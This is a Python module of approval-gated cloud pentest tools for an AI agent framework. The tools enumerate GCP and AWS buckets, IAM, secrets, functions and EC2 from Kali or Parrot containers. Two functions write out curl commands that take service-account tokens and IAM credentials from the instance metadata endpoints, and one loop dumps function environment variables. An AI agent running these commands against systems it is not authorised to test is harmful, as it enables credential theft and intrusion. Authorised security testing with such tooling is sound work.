import logging
from typing import Any

from clearwing.agent.tooling import tool
from clearwing.agent.tools.ops.pentest_container import KALI, PARROT

logger = logging.getLogger(__name__)


# ──────────────────────────────────────────────────────────────────────────────
# GCP Cloud Pentest Tools
# ──────────────────────────────────────────────────────────────────────────────


@tool(requires_approval=True)
def run_gcp_bucket_enum(
    target_project: str,
    wordlist: str = "/usr/share/wordlists/dirb/common.txt",
    container_id: str | None = None,
    distro: str = "kali",
) -> dict[str, Any]:
    """Enumerate Google Cloud Storage (GCS) buckets for a target.

    Uses gcpbucketbrute or gsutil to discover publicly accessible buckets
    associated with a project. Tests for misconfigurations such as
    public read/write, bucket policy enumeration, and object listing.

    Args:
        target_project: GCP project ID or domain to target (e.g. "lazarus-forms-api").
        wordlist: Path to wordlist for bucket name brute-forcing.
        container_id: Docker container ID. If None auto-discovers one.
        distro: "kali" or "parrot".

    Returns:
        Dict with exit_code, output, and error.
    """
    if container_id is None:
        manager = KALI if distro == "kali" else PARROT
        setup_result = manager.setup()
        container_id = setup_result["container_id"]

    cmd = (
        f"gcpbucketbrute -k {target_project} -w {wordlist} "
        f"|| python3 -c \"from google.cloud import storage; client=storage.Client(); "
        f"[print(b.name) for b in client.list_buckets()]\""
    )
    logger.info("Executing GCP bucket enum in %s container: %s", distro, cmd)
    return KALI.execute(
        container_id, cmd, requires_approval=True
    ) if distro == "kali" else PARROT.execute(
        container_id, cmd, requires_approval=True
    )


@tool(requires_approval=True)
def run_gcp_metadata_exploit(
    container_id: str | None = None,
    distro: str = "kali",
) -> dict[str, Any]:
    """Exploit GCP metadata service to steal service account tokens.

    Attempts to retrieve access tokens, identity tokens, and instance metadata
    from the GCP metadata endpoint (metadata.google.internal / 169.254.169.254).
    Requires either SSRF vulnerability or code execution on the target VM.

    Args:
        container_id: Docker container ID. If None auto-discovers one.
        distro: "kali" or "parrot".

    Returns:
        Dict with exit_code, output, and error.
    """
    if container_id is None:
        manager = KALI if distro == "kali" else PARROT
        setup_result = manager.setup()
        container_id = setup_result["container_id"]

    cmd = (
        "curl -s -H 'Metadata-Flavor: Google' "
        "'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' || "
        "curl -s -H 'Metadata-Flavor: Google' "
        "'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token'"
    )
    logger.info("Executing GCP metadata exploit in %s container", distro)
    return KALI.execute(
        container_id, cmd, requires_approval=True
    ) if distro == "kali" else PARROT.execute(
        container_id, cmd, requires_approval=True
    )


@tool(requires_approval=True)
def run_gcp_iam_audit(
    project_id: str,
    options: str = "",
    container_id: str | None = None,
    distro: str = "kali",
) -> dict[str, Any]:
    """Audit GCP IAM policies and service account permissions.

    Enumerates IAM bindings, service accounts, roles, and policy members
    using gcloud CLI to identify overprivileged accounts or public access.

    Args:
        project_id: GCP project ID to audit.
        options: Additional gcloud flags (e.g. "--flatten=bindings[].members").
        container_id: Docker container ID. If None auto-discovers one.
        distro: "kali" or "parrot".

    Returns:
        Dict with exit_code, output, and error.
    """
    if container_id is None:
        manager = KALI if distro == "kali" else PARROT
        setup_result = manager.setup()
        container_id = setup_result["container_id"]

    cmd = (
        f"gcloud projects get-iam-policy {project_id} {options} && "
        f"gcloud iam service-accounts list --project={project_id}"
    )
    logger.info("Executing GCP IAM audit in %s container: %s", distro, cmd)
    return KALI.execute(
        container_id, cmd, requires_approval=True
    ) if distro == "kali" else PARROT.execute(
        container_id, cmd, requires_approval=True
    )


@tool(requires_approval=True)
def run_gcp_secrets_enum(
    project_id: str,
    options: str = "",
    container_id: str | None = None,
    distro: str = "kali",
) -> dict[str, Any]:
    """Enumerate GCP Secret Manager and Cloud KMS secrets and keys.

    Lists all secrets in Secret Manager and all key rings/keys in Cloud KMS.
    Useful for identifying exposed secrets, weak key configurations, and
    overly permissive IAM policies on sensitive resources.

    Args:
        project_id: GCP project ID.
        options: Additional gcloud flags.
        container_id: Docker container ID. If None auto-discovers one.
        distro: "kali" or "parrot".

    Returns:
        Dict with exit_code, output, and error.
    """
    if container_id is None:
        manager = KALI if distro == "kali" else PARROT
        setup_result = manager.setup()
        container_id = setup_result["container_id"]

    cmd = (
        f"gcloud secrets list --project={project_id} {options} && "
        f"gcloud kms keyrings list --location=global --project={project_id}"
    )
    logger.info("Executing GCP secrets enum in %s container: %s", distro, cmd)
    return KALI.execute(
        container_id, cmd, requires_approval=True
    ) if distro == "kali" else PARROT.execute(
        container_id, cmd, requires_approval=True
    )


@tool(requires_approval=True)
def run_gcp_cloudfunction_enum(
    project_id: str,
    region: str = "us-central1",
    options: str = "",
    container_id: str | None = None,
    distro: str = "kali",
) -> dict[str, Any]:
    """Enumerate GCP Cloud Functions, triggers, and environment variables.

    Lists all deployed Cloud Functions in a project/region, then attempts
    to retrieve function details including environment variables, triggers,
    IAM policies, and runtime settings.

    Args:
        project_id: GCP project ID.
        region: GCP region to enumerate (default: us-central1).
        options: Additional gcloud flags.
        container_id: Docker container ID. If None auto-discovers one.
        distro: "kali" or "parrot".

    Returns:
        Dict with exit_code, output, and error.
    """
    if container_id is None:
        manager = KALI if distro == "kali" else PARROT
        setup_result = manager.setup()
        container_id = setup_result["container_id"]

    cmd = (
        f"gcloud functions list --project={project_id} --regions={region} {options} && "
        f"echo '---' && "
        f"for fn in $(gcloud functions list --project={project_id} --regions={region} "
        f"--format='value(name)'); do "
        f"gcloud functions describe $fn --project={project_id} --region={region} "
        f"--format='yaml(name,status,entryPoint,runtime,environmentVariables,httpsTrigger.url)'; "
        f"done"
    )
    logger.info("Executing GCP Cloud Function enum in %s container: %s", distro, cmd)
    return KALI.execute(
        container_id, cmd, requires_approval=True
    ) if distro == "kali" else PARROT.execute(
        container_id, cmd, requires_approval=True
    )


# ──────────────────────────────────────────────────────────────────────────────
# AWS Cloud Pentest Tools
# ──────────────────────────────────────────────────────────────────────────────


@tool(requires_approval=True)
def run_aws_s3_enum(
    target: str,
    wordlist: str = "/usr/share/wordlists/dirb/common.txt",
    container_id: str | None = None,
    distro: str = "kali",
) -> dict[str, Any]:
    """Enumerate AWS S3 buckets for misconfigurations.

    Uses s3scanner, aws CLI, or brute-forcing to discover S3 buckets
    associated with a domain or naming pattern. Tests for public listing,
    read/write access, bucket policy enumeration, and CORS misconfigurations.

    Args:
        target: Domain, keyword, or naming pattern (e.g. "lazarus" or "lazarus-forms").
        wordlist: Path to wordlist for bucket name permutations.
        container_id: Docker container ID. If None auto-discovers one.
        distro: "kali" or "parrot".

    Returns:
        Dict with exit_code, output, and error.
    """
    if container_id is None:
        manager = KALI if distro == "kali" else PARROT
        setup_result = manager.setup()
        container_id = setup_result["container_id"]

    cmd = (
        f"s3scanner -bucket {target} -wordlist {wordlist} || "
        f"aws s3api list-buckets 2>/dev/null || "
        f"python3 -c \"import boto3; s3=boto3.client('s3'); "
        f"import json; print(json.dumps(s3.list_buckets(), indent=2))\""
    )
    logger.info("Executing AWS S3 enum in %s container: %s", distro, cmd)
    return KALI.execute(
        container_id, cmd, requires_approval=True
    ) if distro == "kali" else PARROT.execute(
        container_id, cmd, requires_approval=True
    )


@tool(requires_approval=True)
def run_aws_ec2_enum(
    region: str = "us-east-1",
    options: str = "",
    container_id: str | None = None,
    distro: str = "kali",
) -> dict[str, Any]:
    """Enumerate AWS EC2 instances, security groups, and IAM roles.

    Lists EC2 instances, security group rules, network interfaces,
    and attached IAM instance profiles. Identifies overly permissive
    security groups and instances with privileged IAM roles.

    Args:
        region: AWS region to enumerate (default: us-east-1).
        options: Additional aws CLI flags.
        container_id: Docker container ID. If None auto-discovers one.
        distro: "kali" or "parrot".

    Returns:
        Dict with exit_code, output, and error.
    """
    if container_id is None:
        manager = KALI if distro == "kali" else PARROT
        setup_result = manager.setup()
        container_id = setup_result["container_id"]

    cmd = (
        f"aws ec2 describe-instances --region={region} {options} && "
        f"aws ec2 describe-security-groups --region={region} {options} && "
        f"aws iam list-roles && "
        f"aws iam list-instance-profiles"
    )
    logger.info("Executing AWS EC2 enum in %s container: %s", distro, cmd)
    return KALI.execute(
        container_id, cmd, requires_approval=True
    ) if distro == "kali" else PARROT.execute(
        container_id, cmd, requires_approval=True
    )


@tool(requires_approval=True)
def run_aws_metadata_exploit(
    endpoint: str = "http://169.254.169.254/latest/meta-data/",
    container_id: str | None = None,
    distro: str = "kali",
) -> dict[str, Any]:
    """Exploit AWS EC2 metadata service (IMDSv1/v2) to steal credentials.

    Retrieves IAM credentials, instance profile data, user-data scripts,
    and other sensitive metadata from the EC2 Instance Metadata Service.
    Works against IMDSv1 by default; attempts IMDSv2 token-based auth if needed.

    Args:
        endpoint: IMDS endpoint URL (default: http://169.254.169.254/latest/meta-data/).
        container_id: Docker container ID. If None auto-discovers one.
        distro: "kali" or "parrot".

    Returns:
        Dict with exit_code, output, and error.
    """
    if container_id is None:
        manager = KALI if distro == "kali" else PARROT
        setup_result = manager.setup()
        container_id = setup_result["container_id"]

    cmd = (
        f"echo '=== IMDSv1 ===' && curl -s {endpoint}iam/security-credentials/ && "
        f"echo '=== IMDSv2 ===' && "
        f"TOKEN=$(curl -s -X PUT 'http://169.254.169.254/latest/api/token' "
        f"-H 'X-aws-ec2-metadata-token-ttl-seconds: 21600') && "
        f"curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" "
        f"{endpoint}iam/security-credentials/"
    )
    logger.info("Executing AWS metadata exploit in %s container", distro)
    return KALI.execute(
        container_id, cmd, requires_approval=True
    ) if distro == "kali" else PARROT.execute(
        container_id, cmd, requires_approval=True
    )


@tool(requires_approval=True)
def run_aws_secrets_enum(
    region: str = "us-east-1",
    options: str = "",
    container_id: str | None = None,
    distro: str = "kali",
) -> dict[str, Any]:
    """Enumerate AWS Secrets Manager and Systems Manager Parameter Store.

    Lists all secrets in Secrets Manager and parameters in SSM Parameter Store.
    Tests for overly permissive KMS key policies and secrets without rotation.

    Args:
        region: AWS region to enumerate (default: us-east-1).
        options: Additional aws CLI flags.
        container_id: Docker container ID. If None auto-discovers one.
        distro: "kali" or "parrot".

    Returns:
        Dict with exit_code, output, and error.
    """
    if container_id is None:
        manager = KALI if distro == "kali" else PARROT
        setup_result = manager.setup()
        container_id = setup_result["container_id"]

    cmd = (
        f"aws secretsmanager list-secrets --region={region} {options} && "
        f"aws ssm describe-parameters --region={region} {options}"
    )
    logger.info("Executing AWS secrets enum in %s container: %s", distro, cmd)
    return KALI.execute(
        container_id, cmd, requires_approval=True
    ) if distro == "kali" else PARROT.execute(
        container_id, cmd, requires_approval=True
    )


@tool(requires_approval=True)
def run_aws_lambda_enum(
    region: str = "us-east-1",
    options: str = "",
    container_id: str | None = None,
    distro: str = "kali",
) -> dict[str, Any]:
    """Enumerate AWS Lambda functions, layers, and IAM roles.

    Lists all Lambda functions in a region, retrieves function code URLs,
    environment variables (if accessible), IAM execution roles, layers,
    and event source mappings.

    Args:
        region: AWS region to enumerate (default: us-east-1).
        options: Additional aws CLI flags.
        container_id: Docker container ID. If None auto-discovers one.
        distro: "kali" or "parrot".

    Returns:
        Dict with exit_code, output, and error.
    """
    if container_id is None:
        manager = KALI if distro == "kali" else PARROT
        setup_result = manager.setup()
        container_id = setup_result["container_id"]

    cmd = (
        f"aws lambda list-functions --region={region} {options} && "
        f"echo '---' && "
        f"for fn in $(aws lambda list-functions --region={region} "
        f"--query 'Functions[*].FunctionName' --output text); do "
        f"echo \"=== $fn ===\" && "
        f"aws lambda get-function --region={region} --function-name $fn "
        f"--query 'Configuration.{Role:Role,EnvVars:Environment.Variables,Layers:Layers}' "
        f"--output yaml; "
        f"done"
    )
    logger.info("Executing AWS Lambda enum in %s container: %s", distro, cmd)
    return KALI.execute(
        container_id, cmd, requires_approval=True
    ) if distro == "kali" else PARROT.execute(
        container_id, cmd, requires_approval=True
    )


@tool(requires_approval=True)
def run_aws_iam_escalation(
    target_user: str,
    options: str = "",
    container_id: str | None = None,
    distro: str = "kali",
) -> dict[str, Any]:
    """Test AWS IAM policies for privilege escalation paths.

    Uses a combination of iam_policy_simulator, cloudsplaining, and
    manual policy analysis to identify overprivileged IAM users/roles
    that could be escalated to admin or other privileged positions.

    Args:
        target_user: IAM user or role ARN to test.
        options: Additional flags for escalation testing tools.
        container_id: Docker container ID. If None auto-discovers one.
        distro: "kali" or "parrot".

    Returns:
        Dict with exit_code, output, and error.
    """
    if container_id is None:
        manager = KALI if distro == "kali" else PARROT
        setup_result = manager.setup()
        container_id = setup_result["container_id"]

    cmd = (
        f"cloudsplaining download --profile default && "
        f"cloudsplaining scan --input default.json --output cloudsplaining-report && "
        f"cat cloudsplaining-report/default-iam-results.txt"
    )
    logger.info("Executing AWS IAM escalation test in %s container: %s", distro, cmd)
    return KALI.execute(
        container_id, cmd, requires_approval=True
    ) if distro == "kali" else PARROT.execute(
        container_id, cmd, requires_approval=True
    )
